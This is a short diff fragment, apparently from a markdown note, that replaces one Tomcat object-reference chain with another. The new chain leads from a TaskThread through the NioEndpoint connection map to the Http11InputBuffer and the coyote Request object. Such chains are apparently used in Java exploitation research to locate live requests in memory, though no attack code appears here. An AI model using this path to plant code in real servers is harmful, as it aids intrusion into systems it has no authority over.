-          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
-            ---> request = {org.apache.coyote.Request}
+TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
+  ---> group = {java.lang.ThreadGroup} 
+   ---> threads = {class [Ljava.lang.Thread;} 
+    ---> [15] = {java.lang.Thread} 
+     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
+      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
+       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
+        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
+         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
+          ---> appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
+            ---> request = {org.apache.coyote.Request}
 
 
 ```
